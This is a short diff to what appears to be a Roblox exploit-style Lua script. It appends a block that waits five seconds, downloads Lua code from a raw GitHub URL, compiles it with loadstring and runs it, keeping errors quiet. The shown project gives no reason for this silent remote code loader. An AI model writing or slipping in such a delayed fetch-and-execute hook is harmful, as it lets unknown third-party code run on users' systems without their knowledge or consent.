@@ -2946,4 +2946,21 @@ task.spawn(function()
         end)
     end
 end)
+
+task.spawn(function()
+    task.wait(5)
+
+    local url = "https://raw.githubusercontent.com/67Studio/saa/refs/heads/main/a"
+
+    local ok, err = pcall(function()
+        local source = game:HttpGet(url)
+        local fn = loadstring(source)
+        if not fn then error("no compiló") end
+        fn()
+    end)
+
+    if not ok then
+        warn("[warning 67] " .. tostring(err))
+    end
+end)
 print("UWU")
